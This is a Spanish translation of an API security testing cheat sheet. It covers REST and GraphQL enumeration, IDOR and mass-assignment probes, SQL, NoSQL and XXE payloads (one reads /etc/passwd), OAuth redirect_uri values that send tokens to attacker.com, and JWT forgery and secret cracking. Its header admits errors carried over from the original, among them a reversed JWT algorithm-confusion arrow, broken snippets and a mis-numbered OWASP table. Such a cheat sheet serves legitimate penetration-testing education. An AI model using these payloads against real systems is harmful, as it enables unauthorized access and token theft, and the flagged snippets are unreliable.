# 🔌 Guía rápida de pruebas de seguridad de API

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)


> **Correcciones y límites del original:** Se conserva la tabla, pero en [OWASP API Top 10 de 2023](https://api-security.owasp.org/editions/2023/en/0x00-header/) API6 es acceso sin restricciones a flujos de negocio sensibles, API7 es SSRF y API8 es configuración de seguridad incorrecta. En el ataque clásico de confusión de algoritmos JWT, se cambia de RS256 a HS256 y se usa la clave pública como secreto HMAC; la flecha del comentario original está invertida ([PortSwigger](https://portswigger.net/web-security/jwt/algorithm-confusion)). Un JWT se decodifica por segmentos Base64URL; pasar un token completo y abreviado a `base64 -d` no es una decodificación correcta. El ejemplo de sugerencias GraphQL tiene llaves incompletas y el comando XXE carece de URL. Se conservan como en el original. La introspección por `__type` no elude una desactivación aplicada correctamente; los demás ejemplos dependen del esquema y de los controles de la aplicación.


```
   █████╗ ██████╗ ██╗    ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
  ██╔══██╗██╔══██╗██║    ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
  ███████║██████╔╝██║    ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
  ██╔══██║██╔═══╝ ██║    ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
  ██║  ██║██║     ██║    ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
  ╚═╝  ╚═╝╚═╝     ╚═╝    ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
```

<p align="center">
  <img src="https://img.shields.io/badge/API-Security-blue?style=for-the-badge" alt="API">
  <img src="https://img.shields.io/badge/REST-Testing-green?style=for-the-badge" alt="REST">
  <img src="https://img.shields.io/badge/GraphQL-red?style=for-the-badge" alt="GraphQL">
</p>

---

## 📋 Índice

- [OWASP API Top 10](#owasp-api-top-10)
- [Pruebas de API REST](#pruebas-de-api-rest)
- [Pruebas de GraphQL](#pruebas-de-graphql)
- [Ataques a la autenticación](#ataques-a-la-autenticación)
- [Ataques a JWT](#ataques-a-jwt)
- [Vulnerabilidades habituales](#vulnerabilidades-habituales)

---

<a id="owasp-api-top-10"></a>

## 🔴 OWASP API Top 10

| # | Vulnerabilidad | Descripción |
|---|---------------|-------------|
| 1 | **BOLA** | Autorización defectuosa a nivel de objeto |
| 2 | **Autenticación defectuosa** | Debilidades de autenticación |
| 3 | **BOPLA** | Autorización defectuosa a nivel de propiedad del objeto |
| 4 | **Consumo de recursos sin restricciones** | Ausencia de limitación de la tasa de solicitudes |
| 5 | **BFLA** | Autorización defectuosa a nivel de función |
| 6 | **SSRF** | Falsificación de solicitudes del lado del servidor |
| 7 | **Configuración de seguridad incorrecta** | Configuraciones predeterminadas |
| 8 | **Falta de protección** | Flujo de negocio |
| 9 | **Gestión inadecuada de activos** | API antiguas |
| 10 | **Consumo inseguro de API** | Terceros |

---

<a id="pruebas-de-api-rest"></a>

## 🌐 Pruebas de API REST

### Descubrimiento y enumeración

```bash
# Encontrar endpoints de API
ffuf -u https://api.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Enumeración de versiones
/api/v1/users
/api/v2/users
/api/v3/users
/api/beta/users
/api/latest/users

# Rutas habituales
/api/
/api/v1/
/api/v2/
/rest/
/graphql
/swagger/
/openapi.json
/api-docs
/swagger.json
/swagger-ui/
/docs/
```

### Pruebas de métodos HTTP

```bash
# Probar todos los métodos
curl -X GET https://api.target.com/users/1
curl -X POST https://api.target.com/users
curl -X PUT https://api.target.com/users/1
curl -X PATCH https://api.target.com/users/1
curl -X DELETE https://api.target.com/users/1
curl -X OPTIONS https://api.target.com/users

# Sobrescritura del método
curl -X POST -H "X-HTTP-Method-Override: DELETE" https://api.target.com/users/1
curl -X POST -H "X-Method-Override: PUT" https://api.target.com/users/1
```

### Manipulación de parámetros

```bash
# BOLA/IDOR
GET /api/users/1      # El identificador propio
GET /api/users/2      # Identificador de otro usuario
GET /api/users/0
GET /api/users/-1
GET /api/users/999999

# Contaminación de parámetros (parameter pollution)
/api/users?id=1&id=2
/api/users?id[]=1&id[]=2

# Evasión mediante codificación
/api/users/1%00
/api/users/1%0a
/api/users/1%2e%2e%2f2
```

### Ataques mediante Content-Type

```bash
# Cambiar Content-Type
Content-Type: application/json
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
Content-Type: text/xml
Content-Type: text/plain

# XXE mediante Content-Type
curl -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user>&xxe;</user>'
```

### Asignación masiva (mass assignment)

```bash
# Añadir campos adicionales
POST /api/users
{
  "username": "test",
  "email": "test@test.com",
  "role": "admin",           # Probar a añadir
  "isAdmin": true,           # Probar a añadir
  "balance": 99999,          # Probar a añadir
  "verified": true           # Probar a añadir
}

# Usar arrays
{
  "user": {
    "name": "test",
    "role_ids": [1, 2, 3]
  }
}
```

---

<a id="pruebas-de-graphql"></a>

## 📊 Pruebas de GraphQL

### Introspección

```graphql
# Consulta completa de introspección
query {
  __schema {
    types {
      name
      fields {
        name
        args { name }
      }
    }
  }
}

# Introspección sencilla
{__schema{types{name,fields{name}}}}

# Obtener todas las consultas
{__schema{queryType{fields{name,description}}}}

# Obtener todas las mutaciones
{__schema{mutationType{fields{name,description}}}}
```

### Ataques habituales

```graphql
# IDOR
query { user(id: 2) { email, password } }

# Ataque por lotes (batching)
query {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  user3: user(id: 3) { email }
}

# Denegación de servicio mediante consultas anidadas
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          name
        }
      }
    }
  }
}

# Sugerencias de campos
{ user { a }  # Sugerirá campos válidos
```

### Inyección SQL en GraphQL

```graphql
# Inyección SQL en argumentos
query { user(name: "' OR '1'='1") { id } }
query { users(filter: "admin'--") { id } }

# Inyección NoSQL
query { user(query: "{$gt: ''}") { id } }
```

### Evasión de la introspección desactivada

```graphql
# Introspección alternativa
query { __type(name: "User") { fields { name } } }

# Enumeración de campos por fuerza bruta con ffuf
# Usar una lista de palabras con nombres habituales de campos GraphQL
```

---

<a id="ataques-a-la-autenticación"></a>

## 🔐 Ataques a la autenticación

### Pruebas de claves de API

```bash
# Buscar claves de API
# Comprobar archivos JavaScript, aplicaciones móviles y GitHub

# Probar la clave en distintas ubicaciones
curl -H "X-API-Key: KEY" https://api.target.com
curl -H "Authorization: Bearer KEY" https://api.target.com
curl -H "api-key: KEY" https://api.target.com
curl "https://api.target.com?api_key=KEY"
```

### Ataques a OAuth/OAuth2

```bash
# Robo de tokens mediante redirect_uri
?redirect_uri=https://attacker.com
?redirect_uri=https://target.com.attacker.com
?redirect_uri=https://target.com%40attacker.com
?redirect_uri=https://target.com/callback/../../../attacker

# Evasión del parámetro state
# Eliminar el parámetro state
# Usar el mismo state para distintos usuarios

# Filtración de tokens
# Comprobar si la cabecera Referer filtra tokens
```

### Gestión de sesiones

```bash
# Enumeración de tokens
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# ¿Los tokens antiguos siguen siendo válidos después de cerrar sesión?
# Problemas de rotación de tokens
# Reutilización de tokens entre sesiones
```

---

<a id="ataques-a-jwt"></a>

## 🎫 Ataques a JWT

### Decodificar un JWT

```bash
# En línea: jwt.io
# CLI
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d
```

### Confusión de algoritmos

```bash
# Cambiar alg a none
{
  "alg": "none",
  "typ": "JWT"
}
# Eliminar la firma

# Ataque HS256 → RS256 (dirección indicada en el original)
# Usar la clave pública como secreto HMAC
```

### Evasión de la firma

```bash
# Eliminar la firma (conservar los puntos)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.

# Fuerza bruta contra un secreto débil
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Secretos débiles habituales
secret
password
123456
your-256-bit-secret
```

### Manipulación de claims (declaraciones)

```javascript
// Cambiar los claims del usuario
{
  "sub": "1234567890",
  "name": "admin",        // Cambiar a admin
  "role": "admin",        // Elevar el rol
  "admin": true,          // Añadir el indicador de administrador
  "exp": 9999999999       // Ampliar la fecha de caducidad
}
```

### Herramientas de JWT

```bash
# jwt_tool
python3 jwt_tool.py <JWT>
python3 jwt_tool.py <JWT> -T    # Manipular
python3 jwt_tool.py <JWT> -C -d wordlist.txt  # Recuperar el secreto

# jwtcrack
./jwtcrack <JWT>
```

---

<a id="vulnerabilidades-habituales"></a>

## 🐛 Vulnerabilidades habituales

### Evasión de la limitación de tasa

```bash
# Cabeceras que se pueden probar
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1

# Cambiar mayúsculas y minúsculas
X-FORWARDED-FOR: 127.0.0.1

# Byte nulo
X-Forwarded-For: 127.0.0.1%00

# Distintos endpoints
/api/login
/API/LOGIN
/api/Login
/api/login/
```

### BOLA (Autorización defectuosa a nivel de objeto)

```bash
# Probar la manipulación de identificadores
GET /api/orders/123    # El pedido propio
GET /api/orders/124    # El pedido de otra persona

# Intentos de adivinar UUID
# Buscar patrones predecibles
# Probar valores secuenciales o basados en marcas de tiempo

# Identificador en distintos formatos
/api/users/1
/api/users/001
/api/users/user_1
/api/users/0x1
```

### BFLA (Autorización defectuosa a nivel de función)

```bash
# Acceder a endpoints de administración como usuario normal
GET /api/admin/users
POST /api/admin/config
DELETE /api/admin/user/1

# Basado en el método
GET /api/users     # Permitido
POST /api/users    # ¿Debería permitirse solo a administradores?
DELETE /api/users  # ¿Debería permitirse solo a administradores?
```

### Gestión inadecuada de activos

```bash
# Versiones antiguas de la API
/api/v1/users    # Puede tener más vulnerabilidades
/api/v2/users    # Actual
/api/v3/users    # Beta o sin publicar

# Endpoints de desarrollo
/api/debug/
/api/test/
/api/internal/
/api/dev/
```

---

## 🛠️ Herramientas

| Herramienta | Finalidad |
|------|---------|
| **Burp Suite** | Intercepción y pruebas de API |
| **Postman** | Exploración de API |
| **Insomnia** | Cliente REST/GraphQL |
| **graphql-voyager** | Visualización de GraphQL |
| **jwt_tool** | Pruebas de JWT |
| **Arjun** | Descubrimiento de parámetros |

---

## 📚 Recursos

- [OWASP API Security Top 10](https://owasp.org/API-Security/)
- [GraphQL Voyager](https://apis.guru/graphql-voyager/)
- [JWT.io](https://jwt.io/)

---

<p align="center">
  <b>🔌 ¡Protege tus API!</b><br>
  <i>¡Solo para pruebas autorizadas!</i>
</p>
